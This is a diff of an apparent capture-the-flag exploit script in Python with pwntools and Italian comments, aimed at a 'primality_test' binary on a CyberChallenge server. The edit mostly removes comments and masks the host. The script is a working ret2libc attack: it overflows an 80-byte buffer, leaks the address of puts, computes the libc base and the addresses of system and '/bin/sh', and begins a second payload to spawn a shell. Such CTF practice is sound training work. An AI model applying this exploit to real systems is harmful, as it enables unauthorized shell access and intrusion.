@@ -5,12 +5,11 @@ elf = ELF('./primality_test')
 # Se hai la libc del server, caricala così (altrimenti usa quella locale per test)
 # libc = ELF('./libc.so.6') 
 
-# r = process('./primality_test')
-r = remote('rop.challs.cyberchallenge.it', 9130)
+r = remote(xxxxx)
 
 offset = 80
 
-# --- ROUND 1: LEAK DELL'INDIRIZZO ---
+#leak dell'indirizzo
 print("[*] Fase 1: Estrazione indirizzo reale di puts...")
 
 # Indirizzi statici dal binario (No PIE = sicuri)
@@ -29,23 +28,18 @@ r.sendlineafter(b"number: ", payload1)
 
 # Puts ci risponde con i byte dell'indirizzo reale (4 byte su 32-bit)
 # Dobbiamo pulire l'output se c'è altro testo
-r.recvuntil(b"!\n") # Leggi fino a "Please enter a number!" (o il messaggio finale)
+r.recvuntil(b"!\n") 
 leak = u32(r.recv(4))
 print(f"[+] Leak ricevuto! Indirizzo reale di puts: {hex(leak)}")
 
-# --- CALCOLO BASE LIBC E SYSTEM ---
-# Ora che abbiamo un indirizzo reale, calcoliamo dove si trova tutto il resto
-# Se non hai la libc del server, questi offset potrebbero variare leggermente
-# In una CTF reale, usiamo 'libc-database' per trovare la versione corretta
-# Per ora ipotizziamo la tua libc locale:
-libc_base = leak - 0x67360 # Sostituisci 0x071cd0 con l'offset di puts nella tua libc
-addr_system = libc_base + 0x3cd10 # Sostituisci con l'offset di system
-addr_bin_sh = libc_base + 0x17b8cf # Sostituisci con l'offset di /bin/sh
+libc_base = leak - 0x67360 
+addr_system = libc_base + 0x3cd10 
+addr_bin_sh = libc_base + 0x17b8cf 
 
 print(f"[*] Libc Base: {hex(libc_base)}")
 print(f"[*] System calcolata: {hex(addr_system)}")
 
-# --- ROUND 2: IL COLPO FINALE ---
+# Payload 2:
 print("[*] Fase 2: Invio payload system('/bin/sh')...")
 
 payload2 = b"A" * offset
